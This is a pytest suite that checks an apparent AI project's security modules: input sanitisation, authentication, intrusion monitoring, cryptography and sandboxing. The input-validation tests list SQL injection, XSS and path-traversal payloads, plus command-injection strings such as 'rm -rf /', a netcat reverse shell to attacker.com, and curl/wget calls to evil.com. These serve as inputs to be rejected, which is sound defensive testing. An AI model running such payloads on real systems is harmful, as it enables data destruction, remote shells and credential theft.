"""
🧪 FORTRESS-LEVEL SECURITY TESTING & VALIDATION
Comprehensive security tests, penetration testing, and vulnerability validation.
"""

import pytest
import time
import secrets
from pathlib import Path
from unittest.mock import patch, MagicMock

from omni_ai.security.input_validation import (
    InputSanitizer, SecurityValidator, SecurityError,
    SecureTextInput, SecureFileInput
)
from omni_ai.security.auth import (
    AuthenticationManager, APIKeyManager, AccessControl,
    SecurityLevel, Permission
)
from omni_ai.security.monitoring import (
    SecurityMonitor, IntrusionDetectionSystem,
    SecurityEventType, ThreatLevel
)
from omni_ai.security.crypto import (
    CryptoManager, SecureHasher, DigitalSigner,
    SecureKeyManager, SecureRandom
)
from omni_ai.security.hardening import (
    SystemHardening, ResourceMonitor, SecureSandbox,
    ResourceLimits, SandboxConfig
)


class TestInputValidationSecurity:
    """🔒 Test Input Validation & Sanitization Security"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection attack prevention"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/'1'='1",
            "1; DELETE FROM users; --",
            "UNION SELECT * FROM passwords",
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_text(malicious_input)
    
    def test_xss_prevention(self):
        """Test Cross-Site Scripting (XSS) prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "javascript:void(0)/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//>",
            "<svg/onload=alert('XSS')>",
        ]
        
        for payload in xss_payloads:
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_text(payload)
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        command_injections = [
            "; rm -rf /",
            "| nc attacker.com 4444 -e /bin/sh",
            "&& curl evil.com/steal.php",
            "$(curl evil.com)",
            "`wget evil.com/backdoor`",
            "powershell.exe -Command 'malicious code'",
        ]
        
        for injection in command_injections:
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_text(injection)
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
        ]
        
        for traversal in path_traversals:
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_filename(traversal)
    
    def test_filename_security(self):
        """Test filename security validation"""
        dangerous_filenames = [
            "CON", "PRN", "AUX", "NUL",
            "COM1", "LPT1",
            "file.txt.exe",
            "../../secret.txt",
            "file<>name.txt",
            "file|name.txt",
        ]
        
        for filename in dangerous_filenames:
            with pytest.raises(SecurityError):
                InputSanitizer.sanitize_filename(filename)
    
    def test_pydantic_validation_security(self):
        """Test Pydantic model security validation"""
        with pytest.raises(ValueError):
            SecureTextInput(text="<script>alert('xss')</script>")
        
        with pytest.raises(ValueError):
            SecureTextInput(text="'; DROP TABLE users; --")
    
    def test_large_input_handling(self):
        """Test handling of excessively large inputs"""
        large_input = "A" * 50000  # 50KB
        
        with pytest.raises(SecurityError):
            InputSanitizer.sanitize_text(large_input, max_length=10000)


class TestAuthenticationSecurity:
    """🔐 Test Authentication & Authorization Security"""
    
    def setup_method(self):
        """Setup test authentication manager"""
        self.auth_manager = AuthenticationManager()
        self.api_key_manager = APIKeyManager()
    
    def test_password_complexity_enforcement(self):
        """Test password complexity requirements"""
        weak_passwords = [
            "password",
            "123456",
            "abc123",
            "Password1",  # Too short
            "verylongpasswordbutnosymbols123",  # No symbols
            "ALLUPPERCASE123!",  # No lowercase
        ]
        
        for weak_password in weak_passwords:
            with pytest.raises(SecurityError):
                self.auth_manager.hash_password(weak_password)
    
    def test_rate_limiting_enforcement(self):
        """Test rate limiting protection"""
        test_ip = "192.168.1.100"
        
        # First few attempts should be allowed
        for i in range(3):
            assert self.auth_manager.check_rate_limit(test_ip)
            self.auth_manager.record_failed_attempt(test_ip)
        
        # After max attempts, should be blocked
        assert not self.auth_manager.check_rate_limit(test_ip)
    
    def test_session_security(self):
        """Test session security measures"""
        user_id = "test_user"
        security_level = SecurityLevel.BASIC
        permissions = [Permission.READ]
        client_ip = "192.168.1.100"
        
        # Create session
        session_id = self.auth_manager.create_session(
            user_id, security_level, permissions, client_ip
        )
        
        # Valid session should work
        session = self.auth_manager.validate_session(session_id, client_ip)
        assert session is not None
        assert session['user_id'] == user_id
        
        # Different IP should fail (session hijacking protection)
        different_ip = "192.168.1.101"
        hijacked_session = self.auth_manager.validate_session(session_id, different_ip)
        assert hijacked_session is None
    
    def test_jwt_token_security(self):
        """Test JWT token security"""
        user_id = "test_user"
        security_level = SecurityLevel.BASIC
        permissions = [Permission.READ]
        
        # Create token
        token = self.auth_manager.create_jwt_token(user_id, security_level, permissions)
        assert token is not None
        
        # Valid token should decode
        payload = self.auth_manager.verify_jwt_token(token)
        assert payload is not None
        assert payload['user_id'] == user_id
        
        # Tampered token should fail
        tampered_token = token[:-5] + "XXXXX"
        invalid_payload = self.auth_manager.verify_jwt_token(tampered_token)
        assert invalid_payload is None
    
    def test_api_key_security(self):
        """Test API key security measures"""
        user_id = "test_user"
        security_level = SecurityLevel.BASIC
        permissions = [Permission.READ]
        
        # Generate API key
        api_key = self.api_key_manager.generate_api_key(
            user_id, security_level, permissions, rate_limit=10
        )
        assert api_key is not None
        assert len(api_key) == 64  # SHA-256 hex
        
        # Valid key should validate
        key_info = self.api_key_manager.validate_api_key(api_key)
        assert key_info is not None
        assert key_info['user_id'] == user_id
        
        # Revoked key should fail
        self.api_key_manager.revoke_api_key(api_key)
        revoked_info = self.api_key_manager.validate_api_key(api_key)
        assert revoked_info is None
    
    def test_permission_enforcement(self):
        """Test role-based access control"""
        # Test permission checking
        user_perms = ['read', 'write']
        required_perms = [Permission.READ, Permission.WRITE]
        
        assert AccessControl.check_permission(user_perms, required_perms)
        
        # Insufficient permissions should fail
        insufficient_perms = ['read']
        assert not AccessControl.check_permission(insufficient_perms, required_perms)
        
        # Test security level checking
        assert AccessControl.check_security_level("admin", SecurityLevel.BASIC)
        assert not AccessControl.check_security_level("basic", SecurityLevel.ADMIN)


class TestMonitoringSecurity:
    """🔍 Test Security Monitoring & Intrusion Detection"""
    
    def setup_method(self):
        """Setup test monitoring system"""
        self.monitor = SecurityMonitor()
        self.ids = IntrusionDetectionSystem(self.monitor)
    
    def test_attack_pattern_detection(self):
        """Test detection of attack patterns"""
        attacker_ip = "192.168.1.200"
        
        # Simulate multiple authentication failures
        for i in range(6):  # Exceeds threshold of 5
            self.monitor.log_security_event(
                SecurityEventType.AUTHENTICATION_FAILURE,
                ThreatLevel.LOW,
                attacker_ip,
                details={'attempt': i}
            )
        
        # Should detect potential credential stuffing attack
        events = list(self.monitor.events)
        attack_events = [e for e in events if e.event_type == SecurityEventType.POTENTIAL_ATTACK]
        assert len(attack_events) > 0
        
        attack_event = attack_events[0]
        assert attack_event.details['attack_type'] == 'credential_stuffing'
    
    def test_injection_attack_detection(self):
        """Test detection of injection attacks"""
        attacker_ip = "10.0.0.50"
        
        # Simulate multiple input validation failures
        for i in range(4):  # Exceeds threshold of 3
            self.monitor.log_security_event(
                SecurityEventType.INPUT_VALIDATION_FAILURE,
                ThreatLevel.MEDIUM,
                attacker_ip,
                details={'injection_attempt': i}
            )
        
        # Should detect potential injection attack
        events = list(self.monitor.events)
        attack_events = [e for e in events if e.event_type == SecurityEventType.POTENTIAL_ATTACK]
        assert len(attack_events) > 0
        
        attack_event = attack_events[0]
        assert attack_event.details['attack_type'] == 'injection_attack'
    
    def test_rate_limiting_detection(self):
        """Test detection of suspicious activity rates"""
        suspicious_ip = "172.16.0.100"
        
        # Simulate high-frequency requests
        for i in range(150):  # Exceeds threshold of 100
            self.monitor.log_security_event(
                SecurityEventType.AUTHENTICATION_SUCCESS,
                ThreatLevel.INFO,
                suspicious_ip
            )
        
        # Should detect suspicious activity
        events = list(self.monitor.events)
        suspicious_events = [e for e in events if e.event_type == SecurityEventType.SUSPICIOUS_ACTIVITY]
        assert len(suspicious_events) > 0
    
    def test_behavioral_anomaly_detection(self):
        """Test behavioral anomaly detection"""
        user_id = "test_user"
        
        # Normal activity baseline
        normal_activity = {
            'requests_per_minute': 5,
            'avg_requests_per_minute': 5,
            'active_hours': [9, 10, 11, 14, 15, 16],
            'source_ip': '192.168.1.10'
        }
        
        # Establish baseline
        is_anomaly = self.ids.analyze_behavioral_anomaly(user_id, normal_activity)
        assert not is_anomaly  # First time, no anomaly
        
        # Anomalous activity (high rate)
        anomalous_activity = {
            'requests_per_minute': 50,  # 10x normal rate
            'source_ip': '192.168.1.10'
        }
        
        is_anomaly = self.ids.analyze_behavioral_anomaly(user_id, anomalous_activity)
        assert is_anomaly  # Should detect anomaly
    
    def test_security_dashboard(self):
        """Test security monitoring dashboard"""
        # Generate some test events
        test_ips = ['192.168.1.1', '10.0.0.1', '172.16.0.1']
        
        for ip in test_ips:
            self.monitor.log_security_event(
                SecurityEventType.AUTHENTICATION_SUCCESS,
                ThreatLevel.INFO,
                ip
            )
        
        # Get dashboard data
        dashboard = self.monitor.get_security_dashboard()
        
        assert 'timestamp' in dashboard
        assert 'total_events' in dashboard
        assert 'event_breakdown' in dashboard
        assert 'threat_breakdown' in dashboard
        assert 'top_source_ips' in dashboard
        assert dashboard['total_events'] >= len(test_ips)


class TestCryptographicSecurity:
    """🔐 Test Cryptographic Security"""
    
    def setup_method(self):
        """Setup crypto manager"""
        self.crypto_manager = CryptoManager()
    
    def test_encryption_security(self):
        """Test encryption security"""
        test_data = b"This is sensitive data that must be protected"
        
        # Encrypt data
        result = self.crypto_manager.encrypt_aes_gcm(test_data)
        assert result.encrypted_data != test_data
        assert len(result.nonce) == 12  # GCM nonce size
        assert len(result.tag) == 16   # GCM tag size
        assert result.algorithm == "AES-256-GCM"
        
        # Decrypt data
        key = secrets.token_bytes(32)  # We need the same key for decryption
        result_with_key = self.crypto_manager.encrypt_aes_gcm(test_data, key)
        decrypted = self.crypto_manager.decrypt_aes_gcm(result_with_key, key)
        
        assert decrypted.decrypted_data == test_data
        assert decrypted.verified == True
    
    def test_password_hashing_security(self):
        """Test secure password hashing"""
        password = "SecurePassword123!"
        
        # Hash password
        hashed = self.crypto_manager.hash_password(password)
        assert hashed != password
        assert len(hashed) > 50  # bcrypt produces long hashes
        
        # Verify password
        assert self.crypto_manager.verify_password(password, hashed)
        assert not self.crypto_manager.verify_password("wrong_password", hashed)
    
    def test_key_derivation_security(self):
        """Test secure key derivation"""
        password = "UserPassword123!"
        
        # PBKDF2 derivation
        key1, salt1 = self.crypto_manager.derive_key_from_password(password)
        key2, salt2 = self.crypto_manager.derive_key_from_password(password, salt1)
        
        assert len(key1) == 32  # 256-bit key
        assert len(salt1) == 32  # 256-bit salt
        assert key1 == key2  # Same password + salt = same key
        
        # Scrypt derivation
        key3, salt3 = self.crypto_manager.derive_key_scrypt(password)
        assert len(key3) == 32
        assert key3 != key1  # Different algorithm = different key
    
    def test_secure_hashing(self):
        """Test secure hashing functions"""
        test_data = "Data to be hashed"
        
        # SHA-256 with salt
        hash1, salt1 = SecureHasher.hash_sha256(test_data)
        hash2, salt2 = SecureHasher.hash_sha256(test_data, salt1)
        
        assert len(hash1) == 64  # SHA-256 hex length
        assert hash1 == hash2  # Same data + salt = same hash
        
        # Verify hash
        assert SecureHasher.verify_hash(test_data, hash1, salt1, "sha256")
        assert not SecureHasher.verify_hash("wrong data", hash1, salt1, "sha256")
    
    def test_digital_signatures(self):
        """Test digital signature security"""
        # Generate key pair
        private_key, public_key = self.crypto_manager.generate_key_pair()
        
        test_data = b"Document to be signed"
        
        # Sign data
        signature = DigitalSigner.sign_data(test_data, private_key)
        assert signature is not None
        assert len(signature) > 0
        
        # Verify signature
        assert DigitalSigner.verify_signature(test_data, signature, public_key)
        
        # Tampered data should fail verification
        tampered_data = b"Tampered document"
        assert not DigitalSigner.verify_signature(tampered_data, signature, public_key)
    
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        # Generate random bytes
        random_bytes = SecureRandom.generate_bytes(32)
        assert len(random_bytes) == 32
        
        # Should be different each time
        random_bytes2 = SecureRandom.generate_bytes(32)
        assert random_bytes != random_bytes2
        
        # Generate secure password
        password = SecureRandom.generate_password(16, include_symbols=True)
        assert len(password) == 16
        
        # Should contain mixed case, digits, symbols
        has_lower = any(c.islower() for c in password)
        has_upper = any(c.isupper() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_symbol = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password)
        
        assert has_lower or has_upper or has_digit  # At least some complexity


class TestSystemHardeningSecurity:
    """🛡️ Test System Hardening & Isolation"""
    
    def setup_method(self):
        """Setup hardening system"""
        self.hardening = SystemHardening()
    
    def test_resource_limits(self):
        """Test resource limit enforcement"""
        limits = ResourceLimits(
            max_memory_mb=100,
            max_cpu_percent=50.0,
            max_execution_time=5
        )
        
        monitor = ResourceMonitor(limits)
        
        # Monitor should initialize successfully
        assert monitor.limits.max_memory_mb == 100
        assert monitor.violations == []
    
    def test_secure_temp_directory(self):
        """Test secure temporary directory creation"""
        temp_dir = self.hardening.create_secure_temp_directory()
        
        assert temp_dir.exists()
        assert temp_dir.is_dir()
        
        # Clean up
        import shutil
        shutil.rmtree(temp_dir)
    
    def test_sandbox_path_validation(self):
        """Test sandbox path validation"""
        config = SandboxConfig(
            allowed_paths=[Path.cwd()],
            blocked_paths=[Path('/etc'), Path('/usr')] if Path('/etc').exists() else [Path('C:\\Windows\\System32')] if Path('C:\\Windows').exists() else [],
            resource_limits=ResourceLimits()
        )
        
        with SecureSandbox(config).execute() as sandbox:
            # Current directory should be allowed
            assert sandbox.is_path_allowed(Path.cwd())
            
            # System directories should be blocked (if they exist)
            system_path = Path('/etc/passwd') if Path('/etc').exists() else Path('C:\\Windows\\System32\\config\\SAM') if Path('C:\\Windows').exists() else None
            if system_path and system_path.parent.exists():
                assert not sandbox.is_path_allowed(system_path)
    
    def test_secure_file_operations(self):
        """Test secure file operation validation"""
        allowed_paths = [Path.cwd()]
        
        def safe_read(path):
            return path.read_text() if path.exists() else "file not found"
        
        # Current directory file should be allowed
        test_file = Path.cwd() / "README.md"
        if test_file.exists():
            result = self.hardening.secure_file_operation(
                safe_read, test_file, allowed_paths
            )
            assert result is not None
        
        # System file should be blocked
        system_file = Path('/etc/passwd') if Path('/etc').exists() else Path('C:\\Windows\\System32\\config\\SAM') if Path('C:\\Windows').exists() else None
        if system_file and system_file.parent.exists():  # System directories exist
            with pytest.raises(SecurityError):
                self.hardening.secure_file_operation(
                    safe_read, system_file, allowed_paths
                )


class TestPenetrationTesting:
    """⚔️ Penetration Testing & Vulnerability Assessment"""
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks"""
        # Password verification should take consistent time
        correct_password = "CorrectPassword123!"
        wrong_password = "WrongPassword123!"
        
        auth_manager = AuthenticationManager()
        password_hash = auth_manager.hash_password(correct_password)
        
        # Time correct password verification
        start_time = time.time()
        auth_manager.verify_password(correct_password, password_hash)
        correct_time = time.time() - start_time
        
        # Time incorrect password verification
        start_time = time.time()
        auth_manager.verify_password(wrong_password, password_hash)
        incorrect_time = time.time() - start_time
        
        # Times should be similar (within reasonable margin)
        time_diff = abs(correct_time - incorrect_time)
        assert time_diff < 0.1  # Less than 100ms difference
    
    def test_buffer_overflow_protection(self):
        """Test buffer overflow protection"""
        # Large inputs should be rejected
        oversized_input = "A" * 1000000  # 1MB string
        
        with pytest.raises(SecurityError):
            InputSanitizer.sanitize_text(oversized_input, max_length=10000)
    
    def test_memory_disclosure_prevention(self):
        """Test prevention of memory disclosure"""
        crypto_manager = CryptoManager()
        
        # Sensitive data should not be accessible in object representation
        password = "SuperSecretPassword123!"
        hashed = crypto_manager.hash_password(password)
        
        # Password should not appear in string representation
        manager_str = str(crypto_manager.__dict__)
        assert password not in manager_str
    
    def test_race_condition_protection(self):
        """Test protection against race conditions"""
        import threading
        
        api_manager = APIKeyManager()
        user_id = "test_user"
        
        # Generate API key
        api_key = api_manager.generate_api_key(
            user_id, SecurityLevel.BASIC, [Permission.READ]
        )
        
        results = []
        errors = []
        
        def validate_key():
            try:
                result = api_manager.validate_api_key(api_key)
                results.append(result is not None)
            except Exception as e:
                errors.append(e)
        
        # Run concurrent validations
        threads = [threading.Thread(target=validate_key) for _ in range(10)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        
        # Should handle concurrent access gracefully
        assert len(errors) == 0  # No errors
        assert all(results)  # All validations successful
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation"""
        # Lower privilege user should not access higher privilege operations
        user_perms = ['read']
        user_level = 'basic'
        
        # Should not allow admin operations
        assert not AccessControl.check_operation_access(
            user_perms, user_level, 'user_management'
        )
        
        # Should not allow system config
        assert not AccessControl.check_operation_access(
            user_perms, user_level, 'system_config'
        )


@pytest.mark.performance
class TestPerformanceSecurity:
    """⚡ Performance & DoS Protection Tests"""
    
    def test_hash_performance_limits(self):
        """Test that hashing operations complete within reasonable time"""
        password = "TestPassword123!"
        
        start_time = time.time()
        auth_manager = AuthenticationManager()
        auth_manager.hash_password(password)
        hash_time = time.time() - start_time
        
        # Should complete within 5 seconds (adjustable based on requirements)
        assert hash_time < 5.0
    
    def test_encryption_performance(self):
        """Test encryption performance"""
        crypto_manager = CryptoManager()
        test_data = b"Performance test data" * 1000  # ~21KB
        
        start_time = time.time()
        result = crypto_manager.encrypt_aes_gcm(test_data)
        encryption_time = time.time() - start_time
        
        # Should encrypt reasonably quickly
        assert encryption_time < 1.0  # Less than 1 second
    
    def test_monitoring_performance(self):
        """Test monitoring system performance"""
        monitor = SecurityMonitor()
        
        start_time = time.time()
        
        # Log many events quickly
        for i in range(1000):
            monitor.log_security_event(
                SecurityEventType.AUTHENTICATION_SUCCESS,
                ThreatLevel.INFO,
                f"192.168.1.{i % 255}",
                details={'test': i}
            )
        
        total_time = time.time() - start_time
        
        # Should handle high event volume efficiently
        assert total_time < 5.0  # Less than 5 seconds for 1000 events


if __name__ == "__main__":
    # Run security tests
    pytest.main([
        __file__, 
        "-v", 
        "--tb=short",
        "-x",  # Stop on first failure for security tests
        "--disable-warnings"
    ])